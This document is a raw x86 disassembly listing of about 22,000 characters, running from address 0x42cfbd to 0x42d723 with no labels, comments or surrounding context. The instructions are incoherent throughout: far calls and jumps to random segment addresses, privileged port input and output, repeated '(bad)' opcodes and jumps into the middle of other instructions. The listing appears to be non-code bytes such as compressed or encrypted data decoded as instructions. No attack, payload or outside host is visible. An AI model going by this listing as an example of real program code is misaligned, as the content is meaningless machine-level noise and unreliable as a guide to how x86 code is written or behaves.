  42cfbd:	add    eax,0x85c11ef7
  42cfc2:	cmp    eax,0x8acb6f7c
  42cfc7:	in     al,0x9e
  42cfc9:	dec    esi
  42cfca:	fwait
  42cfcb:	push   edx
  42cfcc:	mov    eax,ds:0x36ce6602
  42cfd1:	push   0xb89767a
  42cfd6:	sbb    ah,0x41
  42cfd9:	adc    BYTE PTR [ecx],ah
  42cfdb:	test   DWORD PTR [esi-0x597d668f],ebx
  42cfe1:	cmp    eax,0xb3ffcea8
  42cfe6:	jg     0x42cfcb
  42cfe8:	or     esi,DWORD PTR es:[ecx]
  42cfeb:	daa    
  42cfec:	mov    cl,0x4e
  42cfee:	sti    
  42cfef:	in     al,0xf2
  42cff1:	add    ecx,ebx
  42cff3:	js     0x42d06c
  42cff5:	jmp    FWORD PTR [ebx-0x4b7c4e00]
  42cffb:	mov    ds:0x516b294e,al
  42d000:	or     BYTE PTR [ebx],0x6e
  42d003:	push   edi
  42d004:	mov    DWORD PTR [ebx-0x60],ebp
  42d007:	loop   0x42d04a
  42d009:	inc    edx
  42d00a:	xchg   BYTE PTR [ebx],dl
  42d00c:	outs   dx,BYTE PTR ds:[esi]
  42d00d:	and    al,0xda
  42d00f:	mov    ds:0x9f8cb42e,al
  42d014:	loope  0x42d020
  42d016:	xchg   edi,eax
  42d017:	inc    ebx
  42d018:	jno    0x42d085
  42d01a:	dec    ebp
  42d01b:	test   al,0x10
  42d01d:	fld    TBYTE PTR [eax]
  42d01f:	popf   
  42d020:	mov    dl,0x7
  42d022:	mov    esi,0xc25dce30
  42d027:	in     al,dx
  42d028:	mov    al,0xb
  42d02a:	and    ebx,DWORD PTR [esi+0x22]
  42d02d:	cmp    BYTE PTR ds:0x9e236b24,ah
  42d033:	fidiv  WORD PTR [edi+0x5]
  42d036:	enter  0x3202,0x3
  42d03a:	call   0x204ebd65
  42d03f:	dec    esp
  42d040:	es clc 
  42d042:	push   eax
  42d043:	cld    
  42d044:	retf   
  42d045:	test   BYTE PTR [edx],ch
  42d047:	div    BYTE PTR [edx+0x6acdef9]
  42d04d:	mov    al,ds:0x35855875
  42d052:	jae    0x42d0c0
  42d054:	mov    dl,0x7f
  42d056:	push   0xffffffb6
  42d058:	ins    BYTE PTR es:[edi],dx
  42d059:	xchg   esp,eax
  42d05a:	popa   
  42d05b:	clc    
  42d05c:	mov    cl,0x90
  42d05e:	push   eax
  42d05f:	addr16 pop eax
  42d061:	mov    eax,ds:0xfbb01c9c
  42d066:	loopne 0x42d0c8
  42d068:	stc    
  42d069:	or     ebp,DWORD PTR [edi]
  42d06b:	add    bl,BYTE PTR [ebx]
  42d06d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d06e:	in     eax,0x1
  42d070:	daa    
  42d071:	cli    
  42d072:	call   0x1c3d:0x8f819984
  42d079:	arpl   WORD PTR [edi+eiz*4+0x71],cx
  42d07d:	jns    0x42d053
  42d07f:	add    bl,ch
  42d081:	push   ebp
  42d082:	in     al,dx
  42d083:	jmp    0x4bd0:0x2d9fa458
  42d08a:	nop
  42d08b:	inc    edx
  42d08c:	jb     0x42d10b
  42d08e:	rol    eax,0xc6
  42d091:	or     al,0x84
  42d093:	add    edi,DWORD PTR [ecx]
  42d095:	dec    esp
  42d096:	rcl    BYTE PTR [esi+0x57e35992],0xb9
  42d09d:	outs   dx,BYTE PTR ds:[esi]
  42d09e:	call   0x8359:0xdac7eb37
  42d0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0a6:	mov    fs,WORD PTR [esi-0x47fd4046]
  42d0ac:	cmp    DWORD PTR [edx+0x2e7c9732],ecx
  42d0b2:	call   0xb6de:0x15d48aed
  42d0b9:	lock mov esp,DWORD PTR [edi+0x6b0743a]
  42d0c0:	ret    
  42d0c1:	enter  0x6e8c,0xb1
  42d0c5:	pop    ecx
  42d0c6:	sbb    edi,ecx
  42d0c8:	dec    edi
  42d0c9:	push   ecx
  42d0ca:	fnstsw WORD PTR [edi]
  42d0cc:	test   BYTE PTR [eax-0x2afd6342],dh
  42d0d2:	sbb    ah,cl
  42d0d4:	jb     0x42d083
  42d0d6:	adc    ah,dl
  42d0d8:	fsub   QWORD PTR [eax]
  42d0da:	call   0x7f24:0x8fcab5a9
  42d0e1:	(bad)  
  42d0e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0e4:	call   0x4de138ad
  42d0e9:	(bad)  
  42d0ea:	dec    ebx
  42d0eb:	in     al,0xb2
  42d0ed:	push   esp
  42d0ee:	frstor [esi]
  42d0f0:	xchg   edx,eax
  42d0f1:	mov    al,ds:0xb282d2a
  42d0f6:	xor    eax,0x4087cf54
  42d0fb:	add    ch,BYTE PTR [eax+0x4ea09b83]
  42d101:	mov    DWORD PTR [ebx],eax
  42d103:	add    ebx,edx
  42d105:	test   BYTE PTR [ecx+0x27],ch
  42d108:	xchg   esp,eax
  42d109:	inc    edi
  42d10a:	mov    bh,0x83
  42d10c:	xor    eax,0x7caeb5fa
  42d111:	and    ebx,DWORD PTR [edx+0x7b24d5d5]
  42d117:	ret    0xf8c5
  42d11a:	call   0x3bbd:0xa5192514
  42d121:	dec    edi
  42d122:	fwait
  42d123:	test   eax,0xe5b9f2a9
  42d128:	repnz pop ecx
  42d12a:	shr    DWORD PTR [edx+0x79a2b88],cl
  42d130:	clc    
  42d131:	adc    cl,BYTE PTR [edi]
  42d133:	mov    bl,0xe
  42d135:	add    edi,DWORD PTR [edi+eiz*4-0x4f]
  42d139:	or     DWORD PTR [ebp-0x170eea9d],0x5f
  42d140:	push   edx
  42d141:	addr16 call 0xc44b:0xa570ef7b
  42d149:	jg     0x42d0fa
  42d14b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d14c:	fcomp  st(0)
  42d14e:	inc    edx
  42d14f:	out    0x48,eax
  42d151:	pusha  
  42d152:	stos   BYTE PTR es:[edi],al
  42d153:	loopne 0x42d1a5
  42d155:	xchg   edx,eax
  42d156:	js     0x42d14e
  42d158:	mov    dl,0x5e
  42d15a:	in     al,dx
  42d15b:	ret    
  42d15c:	cmp    ch,ch
  42d15e:	pop    ebx
  42d15f:	push   es
  42d160:	add    DWORD PTR [ebx+ebx*1],eax
  42d163:	sbb    ecx,edi
  42d165:	ficomp DWORD PTR [edx]
  42d167:	out    0xd0,al
  42d169:	test   DWORD PTR [eax],edi
  42d16b:	dec    edi
  42d16c:	mov    dl,0xe9
  42d16e:	dec    ecx
  42d16f:	cs scas al,BYTE PTR es:[edi]
  42d171:	bound  eax,QWORD PTR [edi-0x80]
  42d174:	imul   edx,DWORD PTR ds:0xb1e12a6,0x1d
  42d17b:	or     al,0x23
  42d17d:	xchg   BYTE PTR [ebx-0xc],ch
  42d180:	mov    dl,0x7d
  42d182:	ja     0x42d16e
  42d184:	pop    esi
  42d185:	xor    ecx,DWORD PTR [ebx+0x4c08bf59]
  42d18b:	mov    WORD PTR [esi],es
  42d18d:	outs   dx,DWORD PTR ds:[esi]
  42d18e:	xchg   ebx,eax
  42d18f:	dec    ebp
  42d190:	sub    cl,BYTE PTR ds:0xd75fa0e7
  42d196:	into   
  42d197:	ja     0x42d197
  42d199:	mov    ch,0x4c
  42d19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d19c:	add    ah,cl
  42d19e:	pop    ebx
  42d19f:	in     eax,0x3a
  42d1a1:	ror    DWORD PTR ds:0x9f095b57,cl
  42d1a7:	sub    DWORD PTR [ecx],esi
  42d1a9:	and    dl,BYTE PTR [ebp-0x77d8ad1f]
  42d1af:	bound  esi,QWORD PTR [ebp-0x11971aa]
  42d1b5:	test   eax,0xef6e74ca
  42d1ba:	jge    0x42d21b
  42d1bc:	jl     0x42d1c7
  42d1be:	inc    eax
  42d1bf:	and    al,BYTE PTR [edx+0x52]
  42d1c2:	std    
  42d1c3:	fdiv   QWORD PTR [edx+0x40]
  42d1c6:	add    cl,ch
  42d1c8:	mov    dl,0x30
  42d1ca:	mov    al,ds:0x70af7286
  42d1cf:	cli    
  42d1d0:	repz or edi,DWORD PTR [ecx+0x1ec45201]
  42d1d7:	in     eax,dx
  42d1d8:	bound  esi,QWORD PTR [esi-0x75e7b166]
  42d1de:	sbb    eax,0xaa80415d
  42d1e3:	sahf   
  42d1e4:	repz pusha 
  42d1e6:	call   0xee0a:0xba1bce65
  42d1ed:	or     DWORD PTR [edx-0x1acd783b],ebx
  42d1f3:	inc    edx
  42d1f4:	sub    ebp,DWORD PTR [ecx]
  42d1f6:	outs   dx,BYTE PTR ds:[esi]
  42d1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1f8:	fst    DWORD PTR [edi+eiz*4-0x3a]
  42d1fc:	push   eax
  42d1fd:	sub    eax,0x19b27ad1
  42d202:	rcl    DWORD PTR [esi+0x28],cl
  42d205:	mov    WORD PTR [edx],?
  42d207:	dec    esi
  42d208:	dec    DWORD PTR [ebx]
  42d20a:	dec    eax
  42d20b:	jmp    0x1b537cf6
  42d210:	xor    al,0xa5
  42d212:	popf   
  42d213:	imul   esp,DWORD PTR [eax-0x2231365a],0xdcdf256b
  42d21d:	shl    BYTE PTR [eax],cl
  42d21f:	pop    es
  42d220:	jne    0x42d1b0
  42d222:	iret   
  42d223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d224:	add    al,al
  42d226:	dec    eax
  42d227:	mov    dl,0xf9
  42d229:	into   
  42d22a:	(bad)  [ebp+0x1e9a08c9]
  42d230:	loopne 0x42d1c7
  42d232:	push   edi
  42d233:	xchg   ebx,eax
  42d234:	gs mov cl,0x72
  42d237:	mov    al,ds:0xf0ab5f26
  42d23c:	imul   edi,ebx,0x759aa9a8
  42d242:	call   0xb835:0x4f19651
  42d249:	mov    esp,0x8271a73a
  42d24e:	jp     0x42d255
  42d250:	fdivr  DWORD PTR [ebp+0x52]
  42d253:	test   eax,0x121225b2
  42d258:	aam    0x3
  42d25a:	pop    ebp
  42d25b:	mov    esi,0x96f50bd7
  42d260:	clc    
  42d261:	pop    edx
  42d262:	jo     0x42d2da
  42d264:	or     bl,BYTE PTR [edi-0x66]
  42d267:	and    al,0x1b
  42d269:	fisttp QWORD PTR [ecx]
  42d26b:	push   0xa4436076
  42d270:	mov    bl,0xc9
  42d272:	push   es
  42d273:	push   edx
  42d274:	inc    ebx
  42d275:	xchg   edx,eax
  42d276:	ja     0x42d2df
  42d278:	lods   al,BYTE PTR ds:[esi]
  42d279:	das    
  42d27a:	mov    edi,0x60a9af6e
  42d27f:	out    dx,al
  42d280:	jne    0x42d2a6
  42d282:	adc    ebp,DWORD PTR [eax-0x641bd75e]
  42d288:	inc    esp
  42d289:	or     eax,DWORD PTR [eax]
  42d28b:	into   
  42d28c:	xchg   ebx,eax
  42d28d:	sbb    BYTE PTR [edi],dh
  42d28f:	arpl   WORD PTR [ecx],ax
  42d291:	push   ss
  42d292:	call   0x419e:0x4ba09556
  42d299:	nop
  42d29a:	stc    
  42d29b:	popf   
  42d29c:	sti    
  42d29d:	call   0xe8c5:0xc050e11a
  42d2a4:	das    
  42d2a5:	leave  
  42d2a6:	fwait
  42d2a7:	outs   dx,BYTE PTR ds:[esi]
  42d2a8:	sub    BYTE PTR [ecx+0x52],bh
  42d2ab:	and    DWORD PTR [ebx],edi
  42d2ad:	mov    bl,0x5a
  42d2af:	add    al,0x31
  42d2b1:	adc    ecx,DWORD PTR [edx+0x11e14b7d]
  42d2b7:	sbb    esi,DWORD PTR [edx+0x3251559e]
  42d2bd:	icebp  
  42d2be:	pop    eax
  42d2bf:	test   DWORD PTR [ebx+ecx*1],edi
  42d2c2:	retf   0xdb35
  42d2c5:	inc    ebx
  42d2c6:	(bad)  
  42d2c7:	shl    BYTE PTR ds:0x421d72e3,cl
  42d2cd:	mov    dh,0x9a
  42d2cf:	push   ebx
  42d2d0:	scas   al,BYTE PTR es:[edi]
  42d2d1:	sub    al,0xbc
  42d2d3:	pop    ss
  42d2d4:	std    
  42d2d5:	cmp    al,0xf8
  42d2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d2d8:	call   0x6f98:0xc503465f
  42d2df:	xchg   DWORD PTR ds:0xb2f0761d,ebx
  42d2e5:	xchg   ebp,eax
  42d2e6:	test   eax,0xbfa8faa
  42d2eb:	outs   dx,BYTE PTR ds:[esi]
  42d2ec:	fs xor al,0x25
  42d2ef:	ret    0xb40
  42d2f2:	xchg   DWORD PTR [ebp+0x21b2655e],edx
  42d2f8:	push   ds
  42d2f9:	stos   BYTE PTR es:[edi],al
  42d2fa:	call   0xd29a:0xd8b0b6b6
  42d301:	mov    ah,0xbb
  42d303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d305:	popf   
  42d306:	fild   DWORD PTR [edx]
  42d308:	jmp    0xfe9b:0xb2e1d165
  42d30f:	jno    0x42d2d3
  42d311:	cmp    eax,0xed133bbf
  42d316:	jle    0x42d2bc
  42d318:	rol    DWORD PTR [ebp+0xf],cl
  42d31b:	in     eax,dx
  42d31c:	fsub   QWORD PTR [edx]
  42d31e:	push   0xffffffa9
  42d320:	pop    ecx
  42d321:	sbb    BYTE PTR [edx-0x433e7755],bl
  42d327:	(bad)  
  42d329:	push   ss
  42d32a:	das    
  42d32b:	test   al,0x1
  42d32d:	xchg   esi,eax
  42d32e:	loope  0x42d35b
  42d330:	push   edx
  42d331:	or     bl,BYTE PTR [esi]
  42d333:	add    al,0x86
  42d335:	sbb    al,0x9a
  42d337:	cmc    
  42d338:	ins    DWORD PTR es:[edi],dx
  42d339:	jae    0x42d336
  42d33b:	sbb    al,0x71
  42d33d:	pop    esi
  42d33e:	jo     0x42d381
  42d340:	js     0x42d34d
  42d342:	loopne 0x42d39d
  42d344:	rcl    ch,cl
  42d346:	dec    esi
  42d347:	mov    ch,0x64
  42d349:	rcr    BYTE PTR [edx+0x185073b3],1
  42d34f:	mov    edx,0xa0f6073a
  42d354:	popf   
  42d355:	aam    0x53
  42d357:	or     eax,0xd1eb8834
  42d35c:	or     bl,BYTE PTR [esi+0x19]
  42d35f:	xchg   edx,eax
  42d360:	mov    dl,0x33
  42d362:	fist   WORD PTR ds:0xd7b3c6a8
  42d368:	sahf   
  42d369:	add    al,0x26
  42d36b:	cdq    
  42d36c:	sub    bh,BYTE PTR [edi+ebx*4-0x54341074]
  42d373:	push   es
  42d374:	idiv   DWORD PTR [eax+0x60]
  42d377:	sbb    bh,BYTE PTR [ebp-0x57c279c4]
  42d37d:	stos   DWORD PTR es:[edi],eax
  42d37e:	(bad)  
  42d37f:	jge    0x42d344
  42d381:	pop    edi
  42d382:	or     al,0xa0
  42d384:	loope  0x42d313
  42d386:	sub    esi,DWORD PTR [edi]
  42d388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d389:	or     eax,eax
  42d38b:	mov    esp,0x6c9a6d96
  42d390:	sbb    ecx,DWORD PTR [eax]
  42d392:	stos   BYTE PTR es:[edi],al
  42d393:	sti    
  42d394:	ins    DWORD PTR es:[edi],dx
  42d395:	adc    ecx,0xffffff9c
  42d398:	pop    edi
  42d399:	sbb    BYTE PTR [edx],bl
  42d39b:	jl     0x42d32f
  42d39d:	sbb    eax,0x1c179180
  42d3a2:	jmp    0x42d350
  42d3a4:	mov    bl,0x26
  42d3a6:	pop    esi
  42d3a7:	add    al,0x19
  42d3a9:	dec    ebx
  42d3aa:	(bad)  
  42d3ab:	mov    dh,0x76
  42d3ad:	ins    BYTE PTR es:[edi],dx
  42d3ae:	shl    DWORD PTR [edi-0x44e119b2],0x70
  42d3b5:	push   ds
  42d3b6:	ret    0xb27b
  42d3b9:	add    eax,0xdf7aba5b
  42d3be:	js     0x42d3ac
  42d3c0:	xchg   ebp,eax
  42d3c1:	ss into 
  42d3c3:	scas   eax,DWORD PTR es:[edi]
  42d3c4:	xor    al,BYTE PTR [ecx]
  42d3c6:	adc    cl,cl
  42d3c8:	xchg   esi,eax
  42d3c9:	test   BYTE PTR [edx+0x9],dh
  42d3cc:	mov    al,0x6
  42d3ce:	push   ebx
  42d3cf:	aaa    
  42d3d0:	dec    edx
  42d3d1:	ret    
  42d3d2:	xor    ah,BYTE PTR [edi+0x6b]
  42d3d5:	xchg   edi,eax
  42d3d6:	test   DWORD PTR [eax+0x630f2bfe],esp
  42d3dc:	repz or edi,DWORD PTR [edx+0x7a]
  42d3e0:	std    
  42d3e1:	les    ebx,FWORD PTR [edx+0x45ca1cc6]
  42d3e7:	jbe    0x42d44f
  42d3e9:	(bad)  
  42d3ea:	xlat   BYTE PTR ds:[ebx]
  42d3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3ec:	dec    edx
  42d3ed:	ja     0x42d3c7
  42d3ef:	les    esi,FWORD PTR [edx-0x2b]
  42d3f2:	or     al,BYTE PTR [edx+0x2a]
  42d3f5:	add    al,0x9a
  42d3f7:	into   
  42d3f8:	and    BYTE PTR [ebp+0x1f],ah
  42d3fb:	ins    DWORD PTR es:[edi],dx
  42d3fc:	dec    ebp
  42d3fd:	mov    al,0x1
  42d3ff:	mov    al,ds:0x47e51ba1
  42d404:	cmp    ecx,edx
  42d406:	ficom  DWORD PTR [esi+edx*4-0x1]
  42d40a:	sbb    al,0x5a
  42d40c:	lea    esp,[ecx]
  42d40e:	inc    esi
  42d40f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d410:	jge    0x42d483
  42d412:	out    0xbb,al
  42d414:	(bad)  
  42d415:	fisubr WORD PTR [edx]
  42d417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d418:	pop    ebx
  42d419:	mov    ch,0x56
  42d41b:	into   
  42d41c:	pop    edx
  42d41d:	push   0x3fb28f29
  42d422:	mov    ds:0xc5989fd,eax
  42d427:	fcom   QWORD PTR [ebx+ecx*1-0x35]
  42d42b:	mov    es,esp
  42d42d:	mov    cl,0xe7
  42d42f:	mov    ebp,0x15a2f679
  42d434:	js     0x42d44e
  42d436:	leave  
  42d437:	aad    0xb2
  42d439:	push   ebx
  42d43a:	pop    esi
  42d43b:	fsubr  QWORD PTR [eax-0x4c]
  42d43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d43f:	(bad)  
  42d440:	fwait
  42d441:	or     ebx,DWORD PTR [edi+0x43]
  42d444:	jnp    0x42d3c9
  42d446:	in     eax,dx
  42d447:	and    eax,0xc9a4908
  42d44c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d44d:	imul   esp,DWORD PTR [edi-0x37],0xffffffdf
  42d451:	sub    ebp,DWORD PTR [edi-0x59]
  42d454:	out    dx,al
  42d455:	jno    0x42d4a7
  42d457:	jae    0x42d4a2
  42d459:	xchg   esi,eax
  42d45a:	add    eax,0x9a1248fa
  42d45f:	lea    esp,gs:[ebp+0x2eadb787]
  42d466:	ficom  WORD PTR [ecx-0x2d]
  42d469:	or     edi,DWORD PTR [ecx+0x3c]
  42d46c:	icebp  
  42d46d:	pop    eax
  42d46e:	push   edx
  42d46f:	mov    al,0xee
  42d471:	dec    ebp
  42d472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d473:	fmul   DWORD PTR [edx+0x2da3ad36]
  42d479:	mov    bl,0x64
  42d47b:	scas   al,BYTE PTR es:[edi]
  42d47c:	jb     0x42d425
  42d47e:	mov    ah,0x24
  42d480:	pop    edi
  42d481:	jne    0x42d4a4
  42d483:	push   ebp
  42d484:	cmc    
  42d485:	jecxz  0x42d480
  42d487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d488:	push   edx
  42d489:	cdq    
  42d48a:	mov    ds:0x429b7c26,eax
  42d48f:	dec    ecx
  42d490:	scas   al,BYTE PTR es:[edi]
  42d491:	(bad)  
  42d492:	call   0x976b:0x6cf71ebe
  42d499:	cwde   
  42d49a:	mov    WORD PTR [eax+0x557c1e3c],fs
  42d4a0:	xchg   ebp,eax
  42d4a1:	sbb    ecx,DWORD PTR [edx-0x6f]
  42d4a4:	mov    bl,0x86
  42d4a6:	call   0x70bf:0x85bf45dd
  42d4ad:	loopne 0x42d509
  42d4af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4b0:	and    BYTE PTR [esi-0x11],0xc8
  42d4b4:	pop    eax
  42d4b5:	call   0xef514c8
  42d4ba:	call   0x9d5cc13a
  42d4bf:	mov    ebp,0xd99e73ea
  42d4c4:	mov    DWORD PTR [edi-0x26],edx
  42d4c7:	cdq    
  42d4c8:	mov    dl,0xda
  42d4ca:	cmp    edi,esp
  42d4cc:	call   0x6960:0xb29ead2e
  42d4d3:	xor    ebp,eax
  42d4d5:	mov    eax,ds:0x188c2f47
  42d4da:	fadd   QWORD PTR [ebx+eiz*1-0x75]
  42d4de:	mov    ebx,0x9a64d44c
  42d4e3:	cmp    al,0x1c
  42d4e5:	shl    BYTE PTR ds:0x36af0f40,cl
  42d4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4ec:	fmul   DWORD PTR [edi-0x7feec640]
  42d4f2:	jp     0x42d4b0
  42d4f4:	xor    ecx,eax
  42d4f6:	call   0xf6b0:0xaa3cdd28
  42d4fd:	push   esp
  42d4fe:	inc    esi
  42d4ff:	test   al,0xe8
  42d501:	mov    dh,0x52
  42d503:	adc    al,0x92
  42d505:	xor    eax,0xc87c05bb
  42d50a:	cdq    
  42d50b:	mov    al,ds:0xd9268fac
  42d510:	xor    esi,esp
  42d512:	jp     0x42d4e3
  42d514:	out    0xb5,al
  42d516:	test   DWORD PTR [ecx-0x455dadfd],ecx
  42d51c:	ret    
  42d51d:	or     ecx,DWORD PTR [esi]
  42d51f:	dec    ebx
  42d520:	ffreep st(6)
  42d522:	dec    ebx
  42d523:	in     eax,dx
  42d524:	mov    ebx,0x1eab66a4
  42d529:	or     bl,al
  42d52b:	das    
  42d52c:	mov    ds:0x8caa5a76,eax
  42d531:	or     esi,DWORD PTR [ebx-0x7e]
  42d534:	fmul   DWORD PTR [ebp-0x2e]
  42d537:	push   ss
  42d538:	shl    BYTE PTR [esi+0x91aa19a],0x2e
  42d53f:	pop    ds
  42d540:	(bad)  
  42d541:	and    al,0x36
  42d543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d544:	xor    bl,BYTE PTR [edi-0x3a319eb8]
  42d54a:	xchg   esi,eax
  42d54b:	jae    0x42d5c2
  42d54d:	push   ss
  42d54e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d54f:	xchg   ebx,eax
  42d550:	add    eax,0x4507bc8b
  42d555:	cmp    ebp,DWORD PTR [ecx]
  42d557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d558:	inc    edi
  42d559:	xor    BYTE PTR [ebx],dh
  42d55b:	lea    edi,[edx+edx*1-0xfad8ca7]
  42d562:	push   ebx
  42d563:	or     DWORD PTR [esi+0x40],edx
  42d566:	cdq    
  42d567:	aad    0x9c
  42d569:	aaa    
  42d56a:	(bad)  
  42d56b:	dec    ebx
  42d56c:	out    0xa0,eax
  42d56e:	jns    0x42d5e7
  42d570:	jl     0x42d5a2
  42d572:	adc    al,0xa7
  42d574:	retf   
  42d575:	scas   eax,DWORD PTR es:[edi]
  42d576:	inc    ecx
  42d577:	push   ebp
  42d578:	xchg   eax,eax
  42d57a:	cmp    ebx,DWORD PTR [eax-0x4e]
  42d57d:	sbb    DWORD PTR [ecx+0x520a74db],eax
  42d583:	ret    0xfdfa
  42d586:	cmp    BYTE PTR [edi+0x4d791b68],ah
  42d58c:	call   0xc1d4:0x2283ad20
  42d593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d594:	pop    edx
  42d595:	nop
  42d596:	popf   
  42d597:	jmp    0xf783ee5c
  42d59c:	mov    esi,0xb09e1266
  42d5a1:	push   cs
  42d5a2:	scas   eax,DWORD PTR es:[edi]
  42d5a3:	sar    BYTE PTR [edi-0x58987c4b],cl
  42d5a9:	mov    ebp,0xbb959e5
  42d5ae:	stos   DWORD PTR es:[edi],eax
  42d5af:	sub    edi,DWORD PTR [ebp+0x1e]
  42d5b2:	lods   al,BYTE PTR ds:[esi]
  42d5b3:	mov    esp,0xba04166
  42d5b8:	jp     0x42d53f
  42d5ba:	cmp    DWORD PTR [esi-0x53f355b5],eax
  42d5c0:	dec    eax
  42d5c1:	jo     0x42d631
  42d5c3:	xor    al,0xaa
  42d5c5:	or     edi,DWORD PTR [edi+0xe09eb87]
  42d5cb:	push   ebp
  42d5cc:	shr    dl,cl
  42d5ce:	call   0x56e387ef
  42d5d3:	sahf   
  42d5d4:	addr16 or al,0xe9
  42d5d7:	int    0xdf
  42d5d9:	sbb    BYTE PTR [ebp+0x5c0bbf71],dl
  42d5df:	jnp    0x42d5cf
  42d5e1:	xchg   ecx,eax
  42d5e2:	stos   DWORD PTR es:[edi],eax
  42d5e3:	jle    0x42d597
  42d5e5:	add    DWORD PTR [eax+0x24514027],esp
  42d5eb:	imul   edx,DWORD PTR [ebx],0xaa986d0b
  42d5f1:	mov    dl,BYTE PTR [edx-0x65cfaddf]
  42d5f7:	stos   DWORD PTR es:[edi],eax
  42d5f8:	in     al,0x4
  42d5fa:	lds    edi,FWORD PTR [eax-0x5c]
  42d5fd:	stos   DWORD PTR es:[edi],eax
  42d5fe:	out    0xaa,eax
  42d600:	rcl    DWORD PTR [esp+esi*2+0x2a6be8d0],cl
  42d607:	in     eax,dx
  42d608:	mov    dl,0xa1
  42d60a:	xor    DWORD PTR [edi-0x4d],ebp
  42d60d:	shl    DWORD PTR [esi],0x9d
  42d610:	pop    eax
  42d611:	adc    esp,DWORD PTR [ecx-0x51]
  42d614:	cmp    al,BYTE PTR [ebx+0x2f]
  42d617:	retf   0x56c4
  42d61a:	fwait
  42d61b:	push   edx
  42d61c:	mov    esi,0xf847e48f
  42d621:	mov    bh,0xda
  42d623:	adc    esp,esp
  42d625:	mov    al,ds:0x1fd58f50
  42d62a:	cmp    al,0xa7
  42d62c:	arpl   WORD PTR [edi],ax
  42d62e:	sbb    al,0x64
  42d630:	push   ebp
  42d631:	fwait
  42d632:	pushf  
  42d633:	dec    ebp
  42d634:	mov    dl,0x24
  42d636:	add    DWORD PTR [edx],eax
  42d638:	jae    0x42d5c8
  42d63a:	mov    ah,0xb5
  42d63c:	int3   
  42d63d:	or     ebp,DWORD PTR [ebx-0x5b7fbfce]
  42d643:	sub    edi,DWORD PTR [edi-0x42]
  42d646:	mov    ds:0x98da731,eax
  42d64b:	add    edx,esi
  42d64d:	sbb    DWORD PTR [eax+0x206defbb],esi
  42d653:	daa    
  42d654:	and    BYTE PTR [bx],ah
  42d657:	jmp    0x42d6a8
  42d659:	cmp    al,0xed
  42d65b:	out    dx,eax
  42d65c:	les    edx,FWORD PTR [ecx+0x72c2029a]
  42d662:	sbb    ch,BYTE PTR [edx-0x6a]
  42d665:	mov    eax,0xe36cb536
  42d66a:	adc    al,0xa9
  42d66c:	inc    edi
  42d66d:	repnz cmp dl,bl
  42d670:	in     al,dx
  42d671:	call   0x9ff5b883
  42d676:	mov    ebp,0x1215cc9b
  42d67b:	mov    ebp,0x1520bee
  42d680:	xchg   ecx,eax
  42d681:	div    BYTE PTR [edi+0x10]
  42d684:	sub    ah,al
  42d686:	call   0x572a:0x608aebce
  42d68d:	cs xor eax,0xb57352a7
  42d693:	bnd jmp 0xade1e751
  42d699:	cmp    al,0xfd
  42d69b:	lock xor DWORD PTR [edi],ebx
  42d69e:	(bad)  
  42d69f:	sti    
  42d6a0:	ins    BYTE PTR es:[edi],dx
  42d6a1:	fld    TBYTE PTR [edi+0x580a9e62]
  42d6a7:	fmul   DWORD PTR [esi+0x29b1b9ec]
  42d6ad:	mov    edi,DWORD PTR [eax-0x39d215f4]
  42d6b3:	pop    esp
  42d6b4:	lock xor esi,esp
  42d6b7:	data16 mov dl,0x14
  42d6ba:	inc    esp
  42d6bb:	fcom   QWORD PTR [eax]
  42d6bd:	xor    eax,0xc6b26dff
  42d6c2:	mov    ebp,0x825f1486
  42d6c7:	int3   
  42d6c8:	mov    esi,0x3867840b
  42d6cd:	lods   al,BYTE PTR ds:[esi]
  42d6ce:	pop    ss
  42d6cf:	mov    ebp,0xe09b5e19
  42d6d4:	inc    ebp
  42d6d5:	lea    ecx,es:[edx+0x40]
  42d6d9:	and    BYTE PTR [esi-0x68],ah
  42d6dc:	jl     0x42d6e9
  42d6de:	or     ebp,DWORD PTR [esp+ebx*2+0x2eaeafe9]
  42d6e5:	mov    ecx,0x840303a3
  42d6ea:	cmp    al,0xb8
  42d6ec:	sbb    eax,0x7df124cb
  42d6f1:	adc    eax,esi
  42d6f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6f4:	xchg   edx,eax
  42d6f5:	(bad)  
  42d6f6:	pop    edx
  42d6f7:	mov    WORD PTR [esi],?
  42d6f9:	xor    DWORD PTR [ebx+0x26],eax
  42d6fc:	mov    dl,0x61
  42d6fe:	or     ch,BYTE PTR [ebp+0x5f11fdc]
  42d704:	lods   al,BYTE PTR ds:[esi]
  42d705:	xor    ecx,ebp
  42d707:	jbe    0x42d6b6
  42d709:	maxps  xmm5,XMMWORD PTR [eax]
  42d70c:	inc    ecx
  42d70d:	in     al,0xb8
  42d70f:	out    dx,eax
  42d710:	out    0xaa,eax
  42d712:	pop    edx
  42d713:	mov    ah,0x8c
  42d715:	loopne 0x42d6b1
  42d717:	mov    ebp,0xae68832c
  42d71c:	jb     0x42d77b
  42d71e:	or     bl,dh
  42d720:	inc    ebx
  42d721:	or     esi,eax
  42d723:	jecxz  0x42d74b
